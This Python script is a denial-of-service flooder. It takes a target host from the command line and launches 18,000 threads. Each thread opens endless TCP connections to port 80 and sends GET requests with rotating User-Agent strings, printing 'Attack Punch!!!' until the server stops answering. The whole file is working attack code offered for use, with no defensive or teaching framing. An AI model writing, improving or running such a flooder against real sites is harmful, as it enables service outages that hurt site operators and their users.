import threading
import socket 
import sys,random
import time
import os
site = sys.argv[1]
t = [None] *9000
a = [None] *9000
l = [None] *9000

print('TARGET SaVe : '+site)
print('Start DDos : high')
time.sleep(1)
F = '\035[91m'
agent = []
agent.append("Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
agent.append("Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7")
agent.append("Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3")
agent.append("Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14")
data = '''
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-us,en;q=0.5
Accept-Encoding: gzip,deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Keep-Alive: 115
Connection: keep-alive'''
def dos():
	while 1:
		try:
			s = socket.socket()
			s.connect((site, 80))
			packet = str("GET / HTTP/1.1\nHost: "+site+"\n\n User-Agent: "+random.choice(agent)+"\n"+data).encode('utf-8')
			s.sendto(packet, (site, 80))	
			s.send(packet)
			print ("\033[96m",time.ctime(time.time()),"\033[0mAttack Punch!!!\033[0m")
		except socket.error:
			print("\033[91mno connection! server maybe has shoot down\033[0m")
			exit(1)
def dos2():
	while 1:
		dos()

for i in range(9000):
	t[i] = threading.Thread(target=dos)
for h in range(9000):
	l[h] = threading.Thread(target=dos2)
for k in range(9000):
	t[k].start()
	l[k].start()
